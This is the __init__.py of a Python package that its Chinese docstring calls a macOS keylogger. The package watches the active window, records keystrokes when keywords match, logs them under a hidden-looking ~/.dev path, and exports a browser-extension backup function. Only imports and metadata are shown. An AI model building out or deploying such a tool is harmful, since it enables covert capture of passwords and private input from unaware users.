"""
键盘记录器包 (Keylogger Package)

持续检测活动窗口，匹配关键词时触发键盘记录，记录到 ~/.dev/wkler/recording_{日期}.log
仅支持 macOS。
"""

__version__ = "0.3.2"
__author__ = "YLX-STUDIO"

from .logger import KeyLogger, create_log_file
from .backup import backup_browser_extensions
from .detectors import get_active_window_name

__all__ = [
    "__version__",
    "KeyLogger",
    "create_log_file",
    "backup_browser_extensions",
    "get_active_window_name",
]
